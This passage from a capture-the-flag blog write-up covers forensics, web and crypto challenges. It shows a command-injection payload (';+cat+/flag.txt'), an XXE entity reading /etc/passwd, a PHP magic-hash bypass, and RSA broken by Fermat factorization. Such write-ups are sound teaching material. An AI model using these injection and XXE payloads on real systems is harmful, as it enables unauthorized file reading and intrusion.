+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>The description of the challenge is as follows.</p>
+<pre tabindex="0"><code>Anoche me tome unos tragos y quede borrado, ayudame a recuperar mi memoria.
+
+Si quieres aprender a resolver retos de tipo Forense, este challenge es un buen comienzo para ti!
+</code></pre><p>We are given an <code>.img</code> and when doing a strings you can see the flag.</p>
+<pre tabindex="0"><code>$ strings challenge.img
+...
+...
+...
+q4{l0_borrado_nunca_esta_borrado}
+</code></pre>
+<h3 id="alive">
+  Alive
+  
+  <a hidden class="anchor" href="#alive">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>Web challenge, command injection with the typical <code>;+cat+/flag.txt</code>.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/fKh93mG.png" alt="" />
+
+
+
+</p>
+
+<h2 id="web">
+  web
+  
+  <a hidden class="anchor" href="#web">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+
+<h3 id="al-choque">
+  Al choque!
+  
+  <a hidden class="anchor" href="#al-choque">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We were given the source code of the application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;secret&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_GET[<span style="color:#e6db74">&#39;secret&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e830400451993494058024219903391&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>($flag);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;No hay flags aca!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We see that it includes the file <code>flag.php</code> which contains the flag, then with an if statement it validates if the secret that we enter encrypted to MD5 is equal to <code>0e830400451993494058024219903391</code>, if this is fulfilled it returns the flag, if not it gives us an error. Searching in Google I realized that the hash <code>0e83040045451993494058024219903391</code> was the string <code>QNKCDZO</code>, so with that I could solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X GET https://q4-alchoque.chals.io/<span style="color:#ae81ff">\?</span>secret<span style="color:#ae81ff">\=</span>QNKCDZO
+</span></span><span style="display:flex;"><span>q4<span style="color:#f92672">{</span>super_f4c1l_gg_compar1s0n_webwebweb<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+<h3 id="el_fr33st4lero">
+  El_Fr33st4lero
+  
+  <a hidden class="anchor" href="#el_fr33st4lero">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>This challenge was one of the ones I liked the most! I spent a lot of time trying to solve it.</p>
+<p>When entering we could see a video of the glorious Matiah Chinaski rapping, when we saw the source code we saw a string that caught my attention <code>//cat</code>, also the video was called <code>cat.mp4</code> so I felt it had to do something with animals. Since I did not find anything I decided to do fuzzing using <code>wfuzz</code> with animal names and extensions, with this command I found the file <code>gato.html</code>.</p>
+<pre tabindex="0"><code>wfuzz -c -t 50 -u https://q4-el-fr33st4lero.chals.io/FUZZFUZ2Z -z file,animales.txt -z file,File-Extensions-Wordlist.txt --hc=404,403
+</code></pre><p>When entering the file we saw a registration form.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/ssfCAnD.png" alt="" />
+
+
+
+</p>
+<p>When filling the form and intercepting the request we see that the data is processed in XML, I automatically knew that this was an XXE so I injected the typical DOCTYPE and I could read files.</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt; ]&gt;
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/3t9GaN6.png" alt="" />
+
+
+
+</p>
+<p>Then I was wasting a lot of time looking for the flag, until it occurred to me to look in <code>/etc/</code> and sure enough, there it was!</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/hBaAk5h.png" alt="" />
+
+
+
+</p>
+
+<h2 id="crypto">
+  crypto
+  
+  <a hidden class="anchor" href="#crypto">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+
+<h3 id="babycrypto">
+  babycrypto
+  
+  <a hidden class="anchor" href="#babycrypto">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We receive the encrypted flag and the source code that encrypts it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flag <span style="color:#f92672">import</span> FLAG
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(plaintext):
+</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, char <span style="color:#f92672">in</span> enumerate(plaintext):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                message <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> char<span style="color:#f92672">.</span>islower():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                message <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            message <span style="color:#f92672">+=</span> char
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> message
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> enc(FLAG)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write the encrypted FLAG to an output file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;message.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(message)
+</span></span></code></pre></div><p>Define an <code>enc()</code> function which encrypts the message using the typical cesar modulo 26 cipher, just write the inverse and the challenge can be solved.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>(ciphertext):
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, char <span style="color:#f92672">in</span> enumerate(ciphertext):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">-</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                plaintext <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> char<span style="color:#f92672">.</span>islower():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">-</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                plaintext <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            plaintext <span style="color:#f92672">+=</span> char
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uo_vq4rs_lbjbgc_frjt_knbnzrbt_IQ_WXAYIUZC_G4&#34;</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> dec(ciphertext)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><p>When we executed it, we obtained the flag in plain text.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve.py 
+</span></span><span style="display:flex;"><span>un_sm4ll_crypto_para_preparar_EL_PPROXIMO_Q4
+</span></span></code></pre></div>
+<h3 id="minicrypto">
+  miniCrypto
+  
+  <a hidden class="anchor" href="#minicrypto">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>This challenge was a vulnerable RSA implementation, since the prime number $q$ was generated in an insecure way and this allowed that by means of <em>Fermat Factorization</em> we could factor $n$ and break the whole cryptosystem. This is the implementation of <em>Fermat Factorization</em> in Python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isqrt</span>(n):
+</span></span><span style="display:flex;"><span>    x<span style="color:#f92672">=</span>n
+</span></span><span style="display:flex;"><span>    y<span style="color:#f92672">=</span>(x<span style="color:#f92672">+</span>n<span style="color:#f92672">//</span>x)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(y<span style="color:#f92672">&lt;</span>x):
+</span></span><span style="display:flex;"><span>        x<span style="color:#f92672">=</span>y
+</span></span><span style="display:flex;"><span>        y<span style="color:#f92672">=</span>(x<span style="color:#f92672">+</span>n<span style="color:#f92672">//</span>x)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fermat</span>(n):
+</span></span><span style="display:flex;"><span>    t0<span style="color:#f92672">=</span>isqrt(n)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    counter<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">=</span>t0<span style="color:#f92672">+</span>counter
+</span></span><span style="display:flex;"><span>    temp<span style="color:#f92672">=</span>isqrt((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>((temp<span style="color:#f92672">*</span>temp)<span style="color:#f92672">!=</span>((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)):
+</span></span><span style="display:flex;"><span>        counter<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">=</span>t0<span style="color:#f92672">+</span>counter
+</span></span><span style="display:flex;"><span>        temp<span style="color:#f92672">=</span>isqrt((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>temp
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">=</span>t<span style="color:#f92672">+</span>s
+</span></span><span style="display:flex;"><span>    q<span style="color:#f92672">=</span>t<span style="color:#f92672">-</span>s
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p,q
+</span></span></code></pre></div><p>When factoring $n$ it is only necessary to do the typical RSA calculations.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">113297151305912403070580180537218896504689162129151290963870792347548172274828888439339824771092686949516048337709550681895700696862849235103504416930344176272766719097558351724788814246272788549027204516072535618493595756759403872850117463642792662718160145892009731606452724621231186976959981900308189755531</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">113297151305912403070580180537218896504689162129151290963870792347548172274828888439339824771092686949516048337709550681895700696862849235103504416930344176272766719097558351724788814246272788549027204516072535618493595756759403872850117463642792662718160145892009731606452724621231186976959981900308189754997</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> inverse(e, phi)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5335936758885879161423355433081046977912425604704954839255728437814818873543632243485494529752176442064203990160911227421739792500178816177216549939700777698916632547957216674152445717172056741243350986611526570455601290091805437221084166967459773081949268202098903185602329736955728542606518569949940633898118323531851517214467309180041904779619873830149073108642740979827115326295272452191775356208119968967436215978408766348998795622791084227177086770364385580014851638733205723845107102103568366094363255217187381857921576152404851953222136602770299643709048596667087952242391567864632554494747483290981146671513</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(long_to_bytes(pow(c, d, n)))
+</span></span></code></pre></div><p>Al ejecutarlo obtenemos la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve2.py 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;q4{un_p0c0_s0l0_un_p0c0_de_RSA!}&#39;</span>
+</span></span></code></pre></div>
+<h2 id="forense">
+  forense
+  
+  <a hidden class="anchor" href="#forense">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+
+<h3 id="volando">
+  Volando
+  
+  <a hidden class="anchor" href="#volando">
+
